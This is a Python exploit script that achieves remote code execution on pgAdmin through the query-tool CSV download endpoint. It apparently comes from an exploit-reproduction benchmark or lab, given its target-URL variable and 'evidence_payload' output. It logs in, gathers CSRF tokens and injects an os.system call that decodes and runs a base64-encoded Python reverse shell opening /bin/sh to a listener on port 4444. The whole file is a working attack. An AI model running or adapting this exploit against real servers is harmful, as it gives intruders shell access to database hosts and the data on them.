#!/usr/bin/env python3
"""Execute a shell through pgAdmin query-tool CSV download."""

import base64
import http.cookiejar
import json
import os
import random
import re
import urllib.error
import urllib.parse
import urllib.request


def request_response(
    opener: urllib.request.OpenerDirector,
    url: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
) -> tuple[int, str]:
    request = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        response = opener.open(request, timeout=45)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode("utf-8", errors="replace")


def login(opener: urllib.request.OpenerDirector, target: str) -> str:
    status, html = request_response(opener, f"{target}/login")
    if status != 200:
        raise RuntimeError(f"login page returned HTTP {status}")
    match = re.search(r'"csrfToken":\s*"([^\"]+)"', html)
    if match is None:
        raise RuntimeError("login page has no CSRF token")
    token = match.group(1)
    form = urllib.parse.urlencode({
        "email": "attacker@example.com",
        "password": "pgadmin004-public",
        "csrf_token": token,
    }).encode()
    status, _ = request_response(
        opener,
        f"{target}/authenticate/login",
        form,
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    if status != 200:
        raise RuntimeError(f"login failed with HTTP {status}")
    status, browser_utils = request_response(opener, f"{target}/browser/js/utils.js")
    match = re.search(r"pgAdmin\['csrf_token'\]\s*=\s*'([^']+)'", browser_utils)
    if status != 200 or match is None:
        raise RuntimeError("authenticated CSRF token unavailable")
    return match.group(1)


def shell_expression() -> str:
    code = (
        "import os,socket;"
        "sock=socket.socket();"
        "sock.connect(('127.0.0.1',4444));"
        "[os.dup2(sock.fileno(),fd) for fd in (0,1,2)];"
        "os.execl('/bin/sh','sh','-i')"
    )
    encoded = base64.b64encode(code.encode()).decode()
    command = f'python3 -c \'import base64;exec(base64.b64decode("{encoded}"))\''
    return f"__import__('os').system({command!r})"


def initialize_query_tool(
    opener: urllib.request.OpenerDirector,
    target: str,
    token: str,
    transaction_id: int,
) -> None:
    database_id = random.randint(10000, 99999)
    body = json.dumps({
        "user": "postgres",
        "password": "fixture",
        "role": "",
        "dbname": "postgres",
    }).encode()
    status, response = request_response(
        opener,
        f"{target}/sqleditor/initialize/sqleditor/{transaction_id}/1/1/{database_id}",
        body,
        {
            "Content-Type": "application/json",
            "X-CSRFToken": token,
            "X-pgA-CSRFToken": token,
        },
    )
    result = json.loads(response)
    if status != 200 or result.get("success") != 1:
        raise RuntimeError(f"query tool initialization failed: {status} {response[:300]}")


def trigger_query_download(
    opener: urllib.request.OpenerDirector,
    target: str,
    token: str,
    transaction_id: int,
) -> int:
    status, response = request_response(
        opener,
        f"{target}/sqleditor/query_tool/download/{transaction_id}",
        json.dumps({"query_commited": shell_expression()}).encode(),
        {
            "Content-Type": "application/json",
            "X-CSRFToken": token,
            "X-pgA-CSRFToken": token,
            "Referer": f"{target}/sqleditor/panel/{transaction_id}?is_query_tool=true",
        },
    )
    if status not in (200, 500):
        raise RuntimeError(f"query download returned HTTP {status}: {response[:300]}")
    return status


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
    )
    token = login(opener, target)
    transaction_id = random.randint(1000000, 9999999)
    initialize_query_tool(opener, target, token, transaction_id)
    status = trigger_query_download(opener, target, token, transaction_id)
    print(json.dumps({
        "evidence_payload": {
            "transaction_id": transaction_id,
            "download_http_status": status,
        },
    }))


if __name__ == "__main__":
    main()
